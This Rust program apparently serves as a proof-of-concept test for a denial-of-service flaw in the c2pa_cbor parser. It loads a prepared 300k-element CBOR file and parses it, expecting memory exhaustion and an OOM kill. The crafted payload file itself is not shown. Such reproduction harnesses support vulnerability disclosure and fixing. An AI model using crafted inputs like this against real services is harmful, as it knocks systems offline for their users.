// CBOR DoS Test - Demonstrates OOM kill
use std::{fs, time::Instant};

fn main() {
    println!("=== C2PA CBOR DOS - OOM TEST ===\n");

    // Look for the file in oom_test/ directory if run from project root
    let file = if std::path::Path::new("oom_test/oom_300k.cbor").exists() {
        "oom_test/oom_300k.cbor"
    } else {
        "oom_300k.cbor"
    };

    println!("[*] Loading {} ...", file);

    match fs::read(file) {
        Ok(cbor_bytes) => {
            let mb = cbor_bytes.len() / 1024 / 1024;
            println!("✓ Loaded {} MB", mb);
            println!("[*] Parsing with c2pa_cbor::from_slice()...");
            println!("[*] This will allocate ~800MB+ and likely OOM kill...\n");

            let start = Instant::now();

            // Test with c2pa_cbor instead of serde_cbor
            match c2pa_cbor::from_slice::<c2pa_cbor::Value>(&cbor_bytes) {
                Ok(value) => {
                    let elapsed = start.elapsed();
                    println!("✓ Parsing succeeded in {:?}", elapsed);

                    // Count elements to show memory impact
                    if let c2pa_cbor::Value::Map(m) = value
                        && let Some(c2pa_cbor::Value::Array(arr)) =
                            m.get(&c2pa_cbor::Value::Text("ingredients".into()))
                    {
                        println!("   Parsed {} elements", arr.len());
                    }
                }
                Err(e) => {
                    println!("✓ Error after {:?}: {}", start.elapsed(), e);
                }
            }
        }
        Err(e) => {
            eprintln!("Failed to load {}: {}", file, e);
            std::process::exit(1);
        }
    }
}
